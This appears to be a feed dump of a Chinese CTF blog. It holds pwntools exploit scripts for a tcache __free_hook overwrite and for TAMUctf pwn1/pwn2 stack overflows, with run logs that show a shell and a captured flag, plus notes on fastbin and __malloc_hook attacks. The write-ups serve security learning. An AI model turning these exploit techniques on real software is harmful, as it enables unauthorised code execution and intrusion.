heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token comment" spellcheck="true">#填满 tcache 7 上方以填入一次 所以这里填充6次即可</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
<span class="token comment" spellcheck="true">#print hex(main_arena)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
dev<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> 
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>
dev<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>4. Show all wallets
5. exit
select your choice :
[*]  input wallet no :
[*]  how much you wanna withdraw? :
[*] Switching to interactive mode
 $ ls
1.py Documents       exp.py         Music     pwntools
core Downloads       god-the-reum      Pictures  Templates
Desktop  examples.desktop  god-the-reum.nam  PublicVideos
$
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Tcache-struct&quot;&gt;&lt;a href=&quot;#Tcache-struct&quot; class=&quot;headerlink&quot; title=&quot;Tcache struct&quot;&gt;&lt;/a&gt;Tcache struct&lt;/h4&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TAMUctf</title>
    <link href="http://iosmosis.github.io/2019/02/23/TAMUctf/"/>
    <id>http://iosmosis.github.io/2019/02/23/TAMUctf/</id>
    <published>2019-02-23T10:57:14.000Z</published>
    <updated>2019-03-10T04:36:10.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>查看ida</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-3Bh]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-10h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-Ch]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Sir Lancelot of Camelot\n"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is your quest?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"To seek the Holy Grail.\n"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is my secret?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">0xDEA110C8</span> <span class="token punctuation">)</span>
    <span class="token function">print_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析：程序流程很简单 需要回答两个问题 后达到漏洞点 存在溢出 需要满足 让v5=0xDEA110C8时 print flag</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-3Bh]</span>
 <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-10h]</span>
</code></pre>
<p>s到v5的offset =0x3b-0x10=0x2b</p>
<p>所以可以构造exp 得到flag</p>
<p>####exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.tamuctf.com'</span><span class="token punctuation">,</span><span class="token number">4321</span><span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is your name?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token string">'Sir Lancelot of Camelot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is your quest?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'To seek the Holy Grail.'</span><span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is my secret?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x2b</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xDEA110C8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>####runing</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@Sec:~$ python pwn1.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to pwn.tamuctf.com on port 4321: Done
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x81 bytes:
    <span class="token string">'Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\n'</span>
    <span class="token string">'What... is your name?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stop<span class="token operator">!</span> Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What<span class="token punctuation">..</span>. is your name?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x18 bytes:
    <span class="token string">'Sir Lancelot of Camelot\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x17 bytes:
    <span class="token string">'What... is your quest?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 
    What<span class="token punctuation">..</span>. is your quest?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x18 bytes:
    <span class="token string">'To seek the Holy Grail.\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x16 bytes:
    <span class="token string">'What... is my secret?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 
    What<span class="token punctuation">..</span>. is my secret?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x30 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 c8  10 a1 de 0a  │aaaa│aaaa│aaa·│····│
    00000030
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode

<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x31 bytes:
    <span class="token string">'Right. Off you go.\n'</span>
    <span class="token string">'gigem{34sy_CC428ECD75A0D392}\n'</span>
    <span class="token string">'\n'</span>
Right. Off you go.
gigem<span class="token punctuation">{</span>34sy_CC428ECD75A0D392<span class="token punctuation">}</span>
</code></pre>
<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>载入ida</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-27h]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which function would you like to call?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>ghidra</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">char</span> local_2f <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_10<span class="token punctuation">;</span>

  local_10 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack0x00000004<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which function would you like to call?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>local_2f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">select_func</span><span class="token punctuation">(</span>local_2f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>gets接收大小为31</p>
<p>gets接收字符串s 然后 执行select_func 函数 跟进</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Eh] [ebp-2Ah] </span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>two<span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> <span class="token number">0x1Fu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> <span class="token string">"one"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">v3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里可以对照ghidra 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">
<span class="token keyword">void</span> <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> local_2e <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 定义了<span class="token keyword">char</span> dest  <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span>
  code <span class="token operator">*</span>local_10<span class="token punctuation">;</span>

  local_10 <span class="token operator">=</span> two<span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>local_2e<span class="token punctuation">,</span>param_1<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>local_2e<span class="token punctuation">,</span><span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    local_10 <span class="token operator">=</span> one<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token punctuation">(</span><span class="token operator">*</span>local_10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>src为gets接收过来的字符串 strncpy函数将src写入dest </p>
<p> strncpy函数只能接受dest [30]</p>
<p>查看 shell函数地址 </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>two    .text            000006AD
print_flag    .text    000006D8    
one    .text            00000754
</code></pre><p>发现 two函数地址与print flag后两位不同 </p>
<p>再查看条件判断 只需要利用 strncpy函数1字节溢出修改two地址 即可</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Which function would you like to call?\n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">30</span><span class="token operator">+</span><span class="token string">'\xd8'</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h3&gt;&lt;p&gt;查看ida&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-li
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS Mojave install pwntools Solved</title>
    <link href="http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/"/>
    <id>http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/</id>
    <published>2018-12-16T08:15:08.000Z</published>
    <updated>2018-12-16T08:19:27.529Z</updated>
    
    <content type="html"><![CDATA[<p>Mojave 直接安装pwntools会报错</p>
<p>主要报错原因是因为 capstone 和 unicorn 安装的问题</p>
<p>这里贴出解决办法</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">brew <span class="token function">install</span> capstone <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> MACOS_UNIVERSAL<span class="token operator">=</span>no <span class="token operator">&amp;&amp;</span> pip <span class="token function">install</span> capstone
brew <span class="token function">install</span> unicorn <span class="token operator">&amp;&amp;</span> UNICORN_QEMU_FLAGS<span class="token operator">=</span><span class="token string">"--python=<span class="token variable"><span class="token variable">`</span><span class="token function">whereis</span> python<span class="token variable">`</span></span>"</span> pip <span class="token function">install</span> unicorn
</code></pre>
<p>之后再运行安装即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mojave 直接安装pwntools会报错&lt;/p&gt;
&lt;p&gt;主要报错原因是因为 capstone 和 unicorn 安装的问题&lt;/p&gt;
&lt;p&gt;这里贴出解决办法&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Fastbin Attack 总结</title>
    <link href="http://iosmosis.github.io/2018/11/29/Fastbin%20Attack/"/>
    <id>http://iosmosis.github.io/2018/11/29/Fastbin Attack/</id>
    <published>2018-11-29T08:02:08.000Z</published>
    <updated>2019-01-04T14:23:09.796Z</updated>
    
    <content type="html"><![CDATA[<p>迷途指针、野指针、空指针</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>迷途指针：也称悬空指针，指的是不指向任何合法的对象的指针,可以指向任何地址,并且对该地址的数值进行修改或删除,可能会造成意想不到的后果
野指针：未被初始化的指针,野指针所导致的错误和迷途指针非常相似,但野指针的问题更容易被发现
空指针：就是一个被赋值为0的指针,它不指向任何的对象或者函数
</code></pre><p>理解typedef void (*funcptr)(void)</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> 只对已有的类型进行别名定义，不产生新的类型
<span class="token macro property">#<span class="token directive keyword">define</span> 只是在预处理过程对代码进行简单的替换</span>

<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span> <span class="token operator">*</span>funcptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义指针类型</span>

<span class="token keyword">void</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token keyword">char</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//定义函数</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    funcptr p1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义了一个该类型的指针p1</span>
    p1 <span class="token operator">=</span> fun1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1指向函数一</span>
    <span class="token function">p1</span><span class="token punctuation">(</span><span class="token string">"hey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="__malloc_hook利用"></a>__malloc_hook利用</h5><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>__malloc_hook 附近

64位下在 __malloc_hook - 0x23 + 0x8 处 的值 为 p64(0x7f) 

然后想办法修改 位于 0x70 的 fastbin 的 chunk 的 fd 为 __malloc_hook - 0x23，然后分配几次 0x70 的 chunk 就可以修改 __malloc_hook

main_arean-&gt;fastbinY 数组

该数组用于存放 指定大小的 fastbin 的表头指针，如果为空则为 p64(0) , 而堆的地址基本 是 0x5x 开头的（其在内存就是 xx xx..... 5x)， 此时如果在 main_arean-&gt;fastbinY 的 相邻项为 0x0 (相邻大小的 fastbin), 就会出现 5x 00 00 00... , 所以就可以出现 0x000000000000005x ，可以把它作为 fastbin 的 size 进行 fastbin attack ，不过作为 fastbin attack 的 size 不能 为 0x55

于是想办法修改 位于 0x50 的 fastbin 的 chunk 的 fd 为 __malloc_hook - 0x23，然后分配几次 0x50 的 chunk 就可以分配到 main_arean, 然后就可以修改 main_arean-&gt;top 

std* 结构体

